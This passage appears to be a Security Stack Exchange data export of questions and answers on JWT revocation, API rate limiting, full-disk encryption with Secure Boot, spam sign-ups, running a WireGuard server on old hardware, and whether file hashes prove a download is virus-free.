<p>I am talking about state and government-level security. Not just against petty criminals.</p>
","3","3","266579","<p>This would be secure if it was smashed beyond repair, however if you're running any cloud services or google drive has some of the files, or its in any cloud storage in general, it could still be accessed.
For an example, Android and iPhone have cloud storage built in.
So yes as long as its not anywhere on a cloud service or online.</p>
","0"
"266438","266438","Limit REST API calls by fingerprinting and IP","<p>I have a question regarding request limits for a REST service endpoint.</p>
<p>I think of course the most basic identification used to limit requests is by taking the user's IP address, but what if we have customers in an office using the same IP address?</p>
<p>I thought about using the HTTP Headers and other properties to fingerprint the user but the attacker could just change the user agent.</p>
<p>Is there a way to uniquely identify a device without the caller being able to maliciously altering its data easily?</p>
","1","3","266439","<p>Apparently using IP addresses only to identify persons is a terrible idea - IPs in most of the cases do not identify a person, but rather a router, behind which possibly tens or hundreds of devices sit behind. That's why banning possibly malicious users by IP is a horrible idea - you might block entire offices, hotels and innocent people, which shared their internet access among others.</p>
<p>Your best approach would be fingerprinting using various fingerprinting JavaScript APIs - installed fonts, canvas data, browser window size (known as viewport I think?) etc and combining this information with IP addresses to uniquely identify devices.</p>
<p>To protect against DDoS Rate Limiting is what you're looking for..</p>
<p>Now for users trying to tamper with this information - most of it can be easily tampered with - Firefox contains settings which prevent fingerprinting, LibreWolf is even more hardcore on that. Brave also offers fingerprinting protection and even by default, so apparently most of this data will be randomized and spoofed making identification nearly impossible in my humble opinion.</p>
","0"
"266438","266438","Limit REST API calls by fingerprinting and IP","<p>I have a question regarding request limits for a REST service endpoint.</p>
<p>I think of course the most basic identification used to limit requests is by taking the user's IP address, but what if we have customers in an office using the same IP address?</p>
<p>I thought about using the HTTP Headers and other properties to fingerprint the user but the attacker could just change the user agent.</p>
<p>Is there a way to uniquely identify a device without the caller being able to maliciously altering its data easily?</p>
","1","3","266463","<p>Your question has <strong>three</strong> parts:</p>
<p>The <strong>first</strong> has to do with <a href=""https://en.wikipedia.org/wiki/Rate_limiting"" rel=""nofollow noreferrer"">limiting the rate of requests</a> that can be made by a specific peer (&quot;<em>I have a question regarding request limits for a REST service endpoint</em>&quot;). This is usually related to defending your system against <a href=""https://en.wikipedia.org/wiki/Denial-of-service_attack"" rel=""nofollow noreferrer"">denial of service attacks</a>. Normally you would want to apply one of the <a href=""https://en.wikipedia.org/wiki/DDoS_mitigation"" rel=""nofollow noreferrer"">suggested mitigations</a> or use a solution offered in the market.</p>
<p>However, if you want a quick-and-dirty solution, you can use the <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For"" rel=""nofollow noreferrer"">X-Forwarded-For</a> HTTP header as a condition to limit the request rate. <em>Beware that this is NOT a safe approach to rely upon</em>, because the header is not guaranteed to be properly populated.</p>
<p>The <strong>second</strong> is related to <a href=""https://en.wikipedia.org/wiki/Device_fingerprint"" rel=""nofollow noreferrer"">device fingerprinting</a> (&quot;<em>Is there a way to uniquely identify a device [...]</em>&quot;). It can be used to identify a device, however there isn't any easy way to do it, because software can be modified to adjust its fingerprint granularity (how unique the fingerprint is). So, in your case, you want to produce a fingerprint based partially on the HTTP headers sent, but those can (and will, if need be) change to modify the fingerprint at will.</p>
<p>Which brings us to the <strong>third</strong> part, which is about <a href=""https://en.wikipedia.org/wiki/Trusted_Computing#Remote_attestation"" rel=""nofollow noreferrer"">remote attestation</a> (&quot;<em>[...] without the caller being able to maliciously altering its data easily?</em>&quot;). You can use remote attestation in order to verify that a user's browser is not modified in order to change its fingerprint, however remote attestation requires the use of trusted computing hardware, which is not available (or enabled) to every client you may have.</p>
<p>So, to answer your question, uniquely identifying a device is not an easy thing to achieve - if at all. As such, limiting the request rate based on a <em>guaranteed</em> client identification is practically impossible.</p>
","0"
"266438","266438","Limit REST API calls by fingerprinting and IP","<p>I have a question regarding request limits for a REST service endpoint.</p>
<p>I think of course the most basic identification used to limit requests is by taking the user's IP address, but what if we have customers in an office using the same IP address?</p>
<p>I thought about using the HTTP Headers and other properties to fingerprint the user but the attacker could just change the user agent.</p>
<p>Is there a way to uniquely identify a device without the caller being able to maliciously altering its data easily?</p>
","1","3","266466","<p>Why not use a customer provided identity like an API key instead?  This way, you can have an ultra high through put system that validates the requests and rate limits, then passes the rate limited traffic to your high request sensitive systems.</p>
","1"
"266378","266378","Understanding FDE: Is the encrypted Linux protected against a compromised boot volume?","<p>I use <a href=""https://community.hetzner.com/tutorials/install-ubuntu-2004-with-full-disk-encryption"" rel=""nofollow noreferrer"">this</a> initramfs-based FDE on my headless server. My motivation is to secure my system against physical tampering.</p>
<p>I am aware that securing an untrusted hardware is <a href=""https://security.stackexchange.com/a/53168/222545"">not possible</a>. This question is more about understanding how things work.</p>
<p>The (unencrypted) boot volume appears to be a big hole in my defense. Is there any protection against a boot-partition modification? E.g. a signature?</p>
<h2>Bonus Question:</h2>
<p>There needs to be an ongoing process to decrypt the system volume in the background, which in turn is based on a &quot;booting&quot;-kernel provided by initramfs. What happens to this booting-kernel, once the (encrypted) system kernel is loaded? How is the decrypting process managed (RAM-access, etc.)? How is the process isolated from the system kernel?</p>
","1","3","266379","<p>Full-disk encryption protects against theft. That is, it protects against a scenario where an attacker gains access to the device, and the owner loses access to the device at that point.</p>
<p>Full-disk encryption alone does not protect against an active attack where the attacker gains access to the device, but the owner is not aware and continues using the device. It's not just a limitation of Linux's implementation, it's inherent in <em>only</em> doing encryption.</p>
<p>Protecting against an active attack requires some form of secure boot in addition to disk encryption. Secure boot requires the cooperation of the hardware:</p>
<ul>
<li>The device contains a tamper-resistant¹ component which contains a secret key R.</li>
<li>The data on the device is encrypted with a key K derived from R.</li>
<li>The tamper-resistant component can check the integrity of critical parts of the device, and is only willing to release R if the device hasn't been tampered with. The critical parts include the code that will receive K.</li>
</ul>
<p>On a PC, this is typically done with a <a href=""https://en.wikipedia.org/wiki/Trusted_Platform_Module"" rel=""nofollow noreferrer"">TPM</a>. The TPM contains R and is only willing to release it after checking that the contents of RAM matches expectations.</p>
<p>Both Linux and Windows can use a TPM for secure boot.</p>
<p>¹ <sub> Tamper-resistant means that if an attacker manages to mess with it, we consider that attacker to be too powerful to defend against. </sub></p>
","3"
"266378","266378","Understanding FDE: Is the encrypted Linux protected against a compromised boot volume?","<p>I use <a href=""https://community.hetzner.com/tutorials/install-ubuntu-2004-with-full-disk-encryption"" rel=""nofollow noreferrer"">this</a> initramfs-based FDE on my headless server. My motivation is to secure my system against physical tampering.</p>
<p>I am aware that securing an untrusted hardware is <a href=""https://security.stackexchange.com/a/53168/222545"">not possible</a>. This question is more about understanding how things work.</p>
<p>The (unencrypted) boot volume appears to be a big hole in my defense. Is there any protection against a boot-partition modification? E.g. a signature?</p>
<h2>Bonus Question:</h2>
<p>There needs to be an ongoing process to decrypt the system volume in the background, which in turn is based on a &quot;booting&quot;-kernel provided by initramfs. What happens to this booting-kernel, once the (encrypted) system kernel is loaded? How is the decrypting process managed (RAM-access, etc.)? How is the process isolated from the system kernel?</p>
","1","3","266389","<p>The main question is: <strong>What's your threat model?</strong></p>
<p>A hard disk getting lost? An attacker stealing the server (or its disks) from the CPD? A hosting company employee going rogue?</p>
<p>What cost are you willing to pay for an enhanced security?</p>
<p>You would get the most assurance by combining a TPM with a user-provided passphrase.</p>
<p>Yes, even a headless server could be provided a boot passphrase: it can get a keyboard or a KVM connected for the boot process. Or alternatively, a usb stick which is inserted for the booting process and then removed.</p>
<p>The main drawback is that such server cannot reboot automatically (in case of maintenance or a power-cut).</p>
<blockquote>
<p>Is there any protection against a boot-partition modification? E.g. a signature?</p>
</blockquote>
<p>This could be done with Secure Boot and proper chaining. You would probably need to configure it with your own keys.</p>
<p>Note that having a verified boot partition would not prevent an attacker from extracting the disk and their contents.</p>
<p>You could remotely provide the key to the &quot;verified boot partition&quot;, but someone who cloned your disk could impersonate the server (basically, create a MITM which syphons the decryption key). You would need to ensure that you are really talking to your server-with-verified-code and not an evil clone. This is surely possible using Intel SGX or similar technologies, but probably not trivial.</p>
<p>Regarding your Bonus question, you boot the final kernel. The initramfs mainly provides some extra modules and scripts. While a two-kernels procedure would be possible, I'm pretty sure you don't have a separate &quot;system kernel&quot;, only the one stored at /boot which is the one you are booting into (plus perhaps some older, unused ones).</p>
<p>Little known fact: although it's not of much use in your case, it is possible to have an encrypted /boot, with grub decrypting /boot (and since /boot is encrypted, it can contain the keys to decrypt the rest of the disk, anyway).</p>
","1"
"266378","266378","Understanding FDE: Is the encrypted Linux protected against a compromised boot volume?","<p>I use <a href=""https://community.hetzner.com/tutorials/install-ubuntu-2004-with-full-disk-encryption"" rel=""nofollow noreferrer"">this</a> initramfs-based FDE on my headless server. My motivation is to secure my system against physical tampering.</p>
<p>I am aware that securing an untrusted hardware is <a href=""https://security.stackexchange.com/a/53168/222545"">not possible</a>. This question is more about understanding how things work.</p>
<p>The (unencrypted) boot volume appears to be a big hole in my defense. Is there any protection against a boot-partition modification? E.g. a signature?</p>
<h2>Bonus Question:</h2>
<p>There needs to be an ongoing process to decrypt the system volume in the background, which in turn is based on a &quot;booting&quot;-kernel provided by initramfs. What happens to this booting-kernel, once the (encrypted) system kernel is loaded? How is the decrypting process managed (RAM-access, etc.)? How is the process isolated from the system kernel?</p>
","1","3","266390","<p>Protecting the boot process has been addressed by the <a href=""https://wiki.debian.org/SecureBoot"" rel=""nofollow noreferrer"">UEFI Secure Boot</a> (see a tutorial on how to <a href=""https://help.ubuntu.com/community/Full_Disk_Encryption_Howto_2019"" rel=""nofollow noreferrer"">install Ubuntu using it</a>).</p>
<p>UEFI SecureBoot can be used to verify that the kernel or any other program that is executed during the boot process has not been tampered with. Although, as you already know, an attacker having physical access to your computer means that there's practically no defense against a system compromise.</p>
<p>The rest of your (bonus) questions should probably be asked to <a href=""https://unix.stackexchange.com/"">unix &amp; linux</a>. However, a quick answer is that you only load one kernel, <a href=""https://serverfault.com/a/351276"">it is not swapped</a> with another one once the system is loaded. What happens is that the initramfs is used to decrypt the partition that has the operating system filesystem and then discarded, but the kernel stays the same.</p>
","1"
"266288","266288","Reason to create fake accounts using real email addresses","<p>I've been dealing with a problem that I can't solve until I find the cause.
We get regularly accounts made with scraped/leaked emails and random names. They are useless because you need to verify the email before logging in, so they remain inactive. Usually, a failed register attempt wouldn't bother me, but people receive activation emails of accounts they didn't create, some mark those emails as spam, and that really bothers me.</p>
<p>If I'd knew why would anyone create such accounts, I'd be able to mitigate them in some way. I already have some checks in place, captcha pops up after the first inactive account from the same IP, but bots got kind of smart.</p>
<p>Does anyone have a clue of what would be the use for such accounts?</p>
","2","3","266291","<p>This is a common issue. The solution is to put into place an email verifier. Usually the email sending services have an option to enable this and use all kinds of techniques to detect if they are fake or not (for example <a href=""https://sendgrid.com/solutions/email-api/email-address-validation-api/"" rel=""nofollow noreferrer"">SendGrid</a>).</p>
<p>As to why this happens - spam. They want to spam with affiliate links and other spam that makes it worth developing these automated tools. Automated tools don't always know to detect that there is &quot;more&quot; to the sign up process such as a verification email or SMS. You can read more about it <a href=""https://mailchimp.com/help/about-fake-signups/"" rel=""nofollow noreferrer"">here</a>.</p>
","0"
"266288","266288","Reason to create fake accounts using real email addresses","<p>I've been dealing with a problem that I can't solve until I find the cause.
We get regularly accounts made with scraped/leaked emails and random names. They are useless because you need to verify the email before logging in, so they remain inactive. Usually, a failed register attempt wouldn't bother me, but people receive activation emails of accounts they didn't create, some mark those emails as spam, and that really bothers me.</p>
<p>If I'd knew why would anyone create such accounts, I'd be able to mitigate them in some way. I already have some checks in place, captcha pops up after the first inactive account from the same IP, but bots got kind of smart.</p>
<p>Does anyone have a clue of what would be the use for such accounts?</p>
","2","3","266311","<p>Make sure that prospects have absolutely no privileges.  If possible store them outside of the regular user list.</p>
<p>Put a CAPTCHA before sending the verification email.  This will deter automated attacks</p>
<p>Check that your verification form is immune to SMTP injection attacks. Check you outbound email logs to ensure that only the intended emails are being created. log formdata from the sign-ups and look for suspicious content.</p>
","0"
"266288","266288","Reason to create fake accounts using real email addresses","<p>I've been dealing with a problem that I can't solve until I find the cause.
We get regularly accounts made with scraped/leaked emails and random names. They are useless because you need to verify the email before logging in, so they remain inactive. Usually, a failed register attempt wouldn't bother me, but people receive activation emails of accounts they didn't create, some mark those emails as spam, and that really bothers me.</p>
<p>If I'd knew why would anyone create such accounts, I'd be able to mitigate them in some way. I already have some checks in place, captcha pops up after the first inactive account from the same IP, but bots got kind of smart.</p>
<p>Does anyone have a clue of what would be the use for such accounts?</p>
","2","3","266511","<p>A victim kindly gave us the info. It appears he was hit with a case of mail bombing (email  flooding) in which he received thousands of emails, probably to hide attacks (password resets and so on).
Not much you can do about that if you're on such a list, we mitigated by showing captcha by default to all IPs from Russia. Works for now, but it's not a strong and lasting solution. Any other options are welcomed.</p>
","0"
"266204","266204","If JWT tokens are stateless how does the auth server know a token is revoked?","<p>I've read that JWT tokens are stateless and you don't need to store the tokens in the database and that this prevents a look up step.</p>
<p>What I don't understand is that according to <a href=""https://datatracker.ietf.org/doc/html/rfc7009"" rel=""noreferrer"">RFC 7009</a> you can revoke a token. Let's say I have a web site with a Sign Out button that calls a token revocation flow like in RFC 7009. If no tokens are stored in the database, what's to prevent the client from using a token that's been revoked?</p>
<p>If I Sign Out, I would expect to have to Sign In again. Is it solely the client's responsibility to clear the token locally?</p>
<p>Do you need to store the refresh token in a database or store to implement RFC 7009?</p>
","21","4","266205","<p>RFC 7009 is about OAuth, not JWT. You are mixing two different technologies: <a href=""https://anil-pace.medium.com/json-web-tokens-vs-oauth-2-0-85dd0b32057d"" rel=""noreferrer"">JWT and OAuth</a>. This <a href=""https://stackoverflow.com/questions/39909419/what-are-the-main-differences-between-jwt-and-oauth-authentication"">question on StackExchange</a> summarizes it well.</p>
<p>JWT is a token format. It defines the fields, the signing protocol, the encoding. OAuth is an authorization protocol that can use JWT or not, depending on the developer.</p>
<p>It's not easy to revoke a JWT, because they are stateless, self contained and don't use a database. Revoking a JWT would require storing some value on a database, looking at that value at each request, and that would look a lot like OAuth but with the overhead of mixing the two together.</p>
","47"
"266204","266204","If JWT tokens are stateless how does the auth server know a token is revoked?","<p>I've read that JWT tokens are stateless and you don't need to store the tokens in the database and that this prevents a look up step.</p>
<p>What I don't understand is that according to <a href=""https://datatracker.ietf.org/doc/html/rfc7009"" rel=""noreferrer"">RFC 7009</a> you can revoke a token. Let's say I have a web site with a Sign Out button that calls a token revocation flow like in RFC 7009. If no tokens are stored in the database, what's to prevent the client from using a token that's been revoked?</p>
<p>If I Sign Out, I would expect to have to Sign In again. Is it solely the client's responsibility to clear the token locally?</p>
<p>Do you need to store the refresh token in a database or store to implement RFC 7009?</p>
","21","4","266207","<blockquote>
<p>Do you need to store the refresh token in a database or store</p>
</blockquote>
<p>Leaving aside the rest of your question: generally, <strong>yes</strong>. JWTs need to be short-lived, specifically because there's no good way to revoke them; if an attacker gets one, they'll generally have access until it expires, so the expiration needs to be soon. To accommodate this, but avoid people needing to log in again constantly, we have refresh tokens. A refresh token, by its very nature, is access-equivalent to a JWT (you can exchange it for a new JWT) but long-lived, so of course the server needs to store a list of which refresh tokens are valid (and for which user/session), within which table the supplied refresh token is looked up upon use (but <em>only</em> when refreshing the JWT, not on every request). The server also needs to delete from the DB (or mark as invalid) the refresh token upon the session ending (by explicit logout, session timeout, remote session revocation, etc.).</p>
<p>The refresh token is generally just a secure random byte string (usually HEX- or Base64-encoded), same as a conventional session/access token. Really the only major difference from a session token is that the session token is used to look up the user/session on every request, whereas a refresh token only needs to do that when the JWT is near or past its expiration. People sometimes add additional protections, such as making refresh tokens single-use (assigning a new one whenever one is used) and/or checking for suspicious use of them (e.g. if the token was issued to a British IP address and then used from a Russian one, that might be suspicious enough you'd force login again rather than respecting the token), but you technically <em>can</em> do similar things with session access tokens too.</p>
","19"
"266204","266204","If JWT tokens are stateless how does the auth server know a token is revoked?","<p>I've read that JWT tokens are stateless and you don't need to store the tokens in the database and that this prevents a look up step.</p>
<p>What I don't understand is that according to <a href=""https://datatracker.ietf.org/doc/html/rfc7009"" rel=""noreferrer"">RFC 7009</a> you can revoke a token. Let's say I have a web site with a Sign Out button that calls a token revocation flow like in RFC 7009. If no tokens are stored in the database, what's to prevent the client from using a token that's been revoked?</p>
<p>If I Sign Out, I would expect to have to Sign In again. Is it solely the client's responsibility to clear the token locally?</p>
<p>Do you need to store the refresh token in a database or store to implement RFC 7009?</p>
","21","4","266208","<p>Providing some context, based on ThoriumBR's answer:</p>
<p>Tokens can be either <em>opaque</em> or <em>structured</em> (see <a href=""https://cloudentity.com/developers/basics/tokens/opaque-token/"" rel=""noreferrer"">here</a> for a short description in the context of OAuth).</p>
<p>An opaque token can be used to implement <em>server side <a href=""https://en.wikipedia.org/wiki/Session_(computer_science)"" rel=""noreferrer"">sessions</a></em>, where the session data are held at the server side and the token functions as a reference to them. An <a href=""https://en.wikipedia.org/wiki/HTTP_cookie"" rel=""noreferrer"">HTTP cookie</a> can be an opaque token.</p>
<p>A structured token can be used to implement <em>client side sessions</em>, where the server does not hold any session data; all the data required to reconstruct the session is held at the token. An example of a structured token is <a href=""https://en.wikipedia.org/wiki/JSON_Web_Token"" rel=""noreferrer"">JWT</a>.</p>
<p>Server side sessions are called <em>stateful</em> sessions. Client side sessions are called <em>stateless</em> sessions.</p>
<p>A session can be invalidated in three ways:</p>
<ol>
<li>client deletes the session token</li>
<li>session token expires</li>
<li>session token is revoked <em>at the server side</em>, anytime before it expires (if at all)</li>
</ol>
<p>Revoking requires server side state (storing which token is valid and/or which is not), that by nature contradicts with the concept of (stateless) client side sessions.</p>
","8"
"266204","266204","If JWT tokens are stateless how does the auth server know a token is revoked?","<p>I've read that JWT tokens are stateless and you don't need to store the tokens in the database and that this prevents a look up step.</p>
<p>What I don't understand is that according to <a href=""https://datatracker.ietf.org/doc/html/rfc7009"" rel=""noreferrer"">RFC 7009</a> you can revoke a token. Let's say I have a web site with a Sign Out button that calls a token revocation flow like in RFC 7009. If no tokens are stored in the database, what's to prevent the client from using a token that's been revoked?</p>
<p>If I Sign Out, I would expect to have to Sign In again. Is it solely the client's responsibility to clear the token locally?</p>
<p>Do you need to store the refresh token in a database or store to implement RFC 7009?</p>
","21","4","266212","<p>JWT tokens cannot be revoked easily unless you check the token against an online database.</p>
<p>However, one option that you can use with JWT is instead of storing active tokens in the database, the database can store revoked token instead.</p>
<p>Storing a list of revoked tokens instead of active tokens has the benefit of making your revocation database being much smaller and simpler than if you store active tokens, so the revocation list can just be stored (and cached) in-memory or with an adjacent in-memory database like Redis. You can imagine a distribution mechanism in which a relying party that needs immediate revocation can subscribe to be notified by the auth/identity server whenever a token is revoked.</p>
<p>The smaller size of revocation list can make it easier to scale out a revocation database compared to active session database. The downside of keeping a revocation database is of course that you lose two of the biggest advantage of JWT, which is simplicity and the ability to verify tokens offline, so this kind of revocation mechanism is rarely used.</p>
<p>The only place where I've seen revocation list is widely used is x509 certificate (i.e. certificate used for TLS connection and S/MIME emails). x509 is not exactly the same as JWT, but x509 uses a signed token authorisation/certification that is functionally quite similar to JWT. In fact, x509 actually has three revocation mechanisms: CRL, OCSP, and Certificate Transparency Log, all of which can have parallels to how you'd implement a revocation mechanism in JWT.</p>
","5"
"266143","266143","Use old computer to run outward facing VPN server","<p>I need to install a computer in a remote location, so that a specific unique user can remotely connect to it via Wireguard VPN. Performance requirements are very low, but security requirements are very high (needs to be very secure against remote attacks).</p>
<p>I could either buy a new computer, but I have an old Dell XPS420 (2.4GHz Intel Core 2 Quad Q6600) lying around, and I'm wondering if I could reuse that.</p>
<p>I can install an up-to-date Linux distro, and setup tight security on the wireguard server, so that part should be fine.
What other vulnerability, beyond the OS, should I consider? The only other one I can think of is the BIOS.</p>
<p>I believe the only BIOS Dell makes available is <a href=""https://www.dell.com/support/home/en-uk/drivers/driversdetails?driverid=r215689&amp;lwp=rt"" rel=""nofollow noreferrer"">the A07</a>, from 2009. Does it present vulnerabilities that can be exploited remotely?</p>
<p>If yes, I will change the motherboard, but reuse all other pieces. Is it reasonable?</p>
","1","3","266149","<p>A remote attacker can only see exposed services. If you can trust the TCP/IP stack provided by you Linux distro and the servers that you will expose, then the configuration can be trusted to be secure against remote attacks.</p>
<p>The hard part when using old systems, is not really that their hardware (including BIOS) is obsolete. But you are more likely to end with a system that will no longer be fully supported by the last releases of the OS or the required applications (generally because of a missing hardware component like for example a TPM). When it happens, you have indeed to choose between a physical upgrade to use the last functionalities, or only stay with the old ones if they still meet your requirements.</p>
<p>And IMHO, the real hard part is to correctly configure the system to reach the expected security level (clearly define the threats and security constraints...) and mainly to keep it up to date after the initial installation...</p>
","1"
"266143","266143","Use old computer to run outward facing VPN server","<p>I need to install a computer in a remote location, so that a specific unique user can remotely connect to it via Wireguard VPN. Performance requirements are very low, but security requirements are very high (needs to be very secure against remote attacks).</p>
<p>I could either buy a new computer, but I have an old Dell XPS420 (2.4GHz Intel Core 2 Quad Q6600) lying around, and I'm wondering if I could reuse that.</p>
<p>I can install an up-to-date Linux distro, and setup tight security on the wireguard server, so that part should be fine.
What other vulnerability, beyond the OS, should I consider? The only other one I can think of is the BIOS.</p>
<p>I believe the only BIOS Dell makes available is <a href=""https://www.dell.com/support/home/en-uk/drivers/driversdetails?driverid=r215689&amp;lwp=rt"" rel=""nofollow noreferrer"">the A07</a>, from 2009. Does it present vulnerabilities that can be exploited remotely?</p>
<p>If yes, I will change the motherboard, but reuse all other pieces. Is it reasonable?</p>
","1","3","266151","<p>Using an older computer for a security-sensitive task can actually be seen as an advantage, as long as the computer is powerful enough.</p>
<p>In newer computers, everything (hardware, drivers, BIOS, etc...) is more complex and has less history of being exposed to both good and bad eyes. This is why newer computers are expected to have more unknown vulnerabilities.</p>
<p>In short, go for it.</p>
<p>If this fails for one reason or another, your second bet could be a router with a wireguard capability - built in or installable.</p>
","0"
"266143","266143","Use old computer to run outward facing VPN server","<p>I need to install a computer in a remote location, so that a specific unique user can remotely connect to it via Wireguard VPN. Performance requirements are very low, but security requirements are very high (needs to be very secure against remote attacks).</p>
<p>I could either buy a new computer, but I have an old Dell XPS420 (2.4GHz Intel Core 2 Quad Q6600) lying around, and I'm wondering if I could reuse that.</p>
<p>I can install an up-to-date Linux distro, and setup tight security on the wireguard server, so that part should be fine.
What other vulnerability, beyond the OS, should I consider? The only other one I can think of is the BIOS.</p>
<p>I believe the only BIOS Dell makes available is <a href=""https://www.dell.com/support/home/en-uk/drivers/driversdetails?driverid=r215689&amp;lwp=rt"" rel=""nofollow noreferrer"">the A07</a>, from 2009. Does it present vulnerabilities that can be exploited remotely?</p>
<p>If yes, I will change the motherboard, but reuse all other pieces. Is it reasonable?</p>
","1","3","266152","<p>There are several hardware and firmware vulnerabilities that have been <a href=""https://resources.infosecinstitute.com/topic/32-hardware-and-firmware-vulnerabilities/"" rel=""nofollow noreferrer"">reported</a> and have been addressed to a certain extend (either by <a href=""https://meltdownattack.com/#faq-fix"" rel=""nofollow noreferrer"">software patches</a> or by <a href=""https://www.engadget.com/2018-03-15-intel-chip-redesign-spectre-meltdown-flaws.html"" rel=""nofollow noreferrer"">re-designing</a> the hardware itself). Whether your hardware is vulnerable to any of these, under any circumstance, needs to be verified though.</p>
<p>In the old days, using an old computer as a dedicated firewall or a VPN server was not a problem. However now that hardware vulnerabilities are well established and exploited, I would be extra careful in doing it; even if you understand how hardware vulnerabilities work, it requires a lot of specialized knowledge in order to verify whether a piece of hardware is affected or not.</p>
<p>In the end of the day, it's all about risk; if you know you'll be targeted by dedicated and resourceful adversaries, I wouldn't recommend using old hardware. Else, by running a fairly recent version of your target OS that has all the required patches, it wouldn't be a problem from a security point of view.</p>
<p>See also this older <a href=""https://security.stackexchange.com/questions/20261/securing-the-hardware-of-my-computer-against-remote-exploits"">question</a>.</p>
","0"
"266109","266109","Is it enough to verify the hash to ensure file is virus free?","<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a <strong>perfect AV</strong>(find every virus) that has <code>sha256</code> database, and everyone can upload any file to it.</p>
<p>This AV scans the uploaded file and stores the hash.</p>
<p>Suppose, the client downloaded some file somewhere and calculates its <code>sha256</code> and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash <strong>has no virus</strong>.</p>
<p><strong>What are the chances that client's file has a virus in it?</strong></p>
<p>So this is more like a hashing problem</p>
","15","9","266112","<p>The hash only shows you if the file was corrupted or altered, not if the file is clean. Someone can send you ransomware with a hash, you calculate the hash and it will show the file wasn't modified, but the file is malicious.</p>
<p>Virus Total will show if the file can be seem as malicious depending on a few factors, but it's trivial to create malware that shows as clean there, but it's not. Ask your favorite search engine about Fully Undetectable Malware and read a little.</p>
<p>Anti Virus solutions are like your immune system: they protect you against threats they know, and threats that look like the things they know. Newer ones infect your body. So newer malware that does not look like older malware can infect you, and the hash does not have anything to protect you.</p>
","11"
"266109","266109","Is it enough to verify the hash to ensure file is virus free?","<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a <strong>perfect AV</strong>(find every virus) that has <code>sha256</code> database, and everyone can upload any file to it.</p>
<p>This AV scans the uploaded file and stores the hash.</p>
<p>Suppose, the client downloaded some file somewhere and calculates its <code>sha256</code> and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash <strong>has no virus</strong>.</p>
<p><strong>What are the chances that client's file has a virus in it?</strong></p>
<p>So this is more like a hashing problem</p>
","15","9","266114","<p>If the hash is clear on VirusTotal, then that file has been analysed by VT's AV engines and nothing was <em>detected</em>. That's slightly different from not having a virus.</p>
<p>Can you modify a file (by adding code) and come out with the same hash? The concept you are looking for is &quot;hash collisions&quot;. Yes, for some hash algorithms, this is possible, but not for the ones that VT uses. It uses MD5 as a possible hash, but is also uses SHA1 and SHA256. It is <em>more</em> possible to create a collision with MD5, but good luck trying to find one, and then whatever you do will not escape SHA1 or SHA256.</p>
","10"
"266109","266109","Is it enough to verify the hash to ensure file is virus free?","<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a <strong>perfect AV</strong>(find every virus) that has <code>sha256</code> database, and everyone can upload any file to it.</p>
<p>This AV scans the uploaded file and stores the hash.</p>
<p>Suppose, the client downloaded some file somewhere and calculates its <code>sha256</code> and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash <strong>has no virus</strong>.</p>
<p><strong>What are the chances that client's file has a virus in it?</strong></p>
<p>So this is more like a hashing problem</p>
","15","9","266117","<p>It depends.  If you download a file and verify the hash against a known trusted source, then that's usually safe.  For example, if you download a Windows CD and the hash matches the one published by Microsoft, then you can verify the file is the one published by Microsoft, assuming you use a secure hash like SHA-256.</p>
<p>If you trust Microsoft not to produce products with malware, but for whatever reason downloading directly from them isn't possible, then this is a good way to ensure your software is free of malware.  However, all a secure hash like SHA-256 tells you is that the software isn't modified (and an insecure hash like MD5 or SHA-1 tells you nothing at all).  If you got the hash from Joe Q. Public's Warez Emporium, then you know the software you got is unmodified from what was uploaded, but it doesn't tell you any more than that, because we can't trust that site to ship only non-mallcious software.</p>
<p>Some sites like VirusTotal may allow you to search by a hash and see what certain antivirus software said for software <em>at the time that the file was uploaded</em>.  They might have later determined that the software was malicious, or it might be malicious but neither match a known threat nor the heuristics.</p>
<p>That's because the decision about whether software is malicious is a human judgment about its behaviour given the totality of the circumstances.  If I'm using Google Chrome with its password manager and it encrypts my passwords and sends them to Google, that's probably okay.  But if it encrypts them and sends them to you, it's not, because you're not the trusted third party I had intended to entrust with my passwords.  It's fundamentally impossible for software to make this assessment, and all it can do is look for patterns of software that match previous malware.</p>
<p>However, in the ideal situation with a perfect antivirus, assuming you're using SHA-256 or another secure hash like a SHA-2, SHA-3, or BLAKE2 hash, then it's functionally impossible to find two files with the same hash, so if your perfect antivirus says a file with that hash is free of viruses, then verifying that your file has that hash is sufficient to prove that it's free of viruses, because they must be the same file.  As I said above, if you use MD5, SHA-1, or an insecure hash, then you can't make that assumption, and you don't know anything interesting by using such a hash.</p>
","41"
"266109","266109","Is it enough to verify the hash to ensure file is virus free?","<p>I download all kinds of stuff from shady places. But I want to be sure there are no nasty viruses in these files. Is it enough if I just check the hash?</p>
<p>For example, when I go <a href=""https://www.virustotal.com"" rel=""noreferrer"">https://www.virustotal.com</a> here and upload my file, I think it computes the hash and looks for it in the database. If the hash is clear - the file is clear. Is that true?</p>
<p>Can I add a virus and modify the file so the hash would be identical to the clean file?</p>
<p>EDIT: The main goal of my question was this:</p>
<p>Suppose we have a <strong>perfect AV</strong>(find every virus) that has <code>sha256</code> database, and everyone can upload any file to it.</p>
<p>This AV scans the uploaded file and stores the hash.</p>
<p>Suppose, the client downloaded some file somewhere and calculates its <code>sha256</code> and searches the hash database.</p>
<p>The database says that there is such a hash in it, and file with that hash <strong>has no virus</strong>.</p>
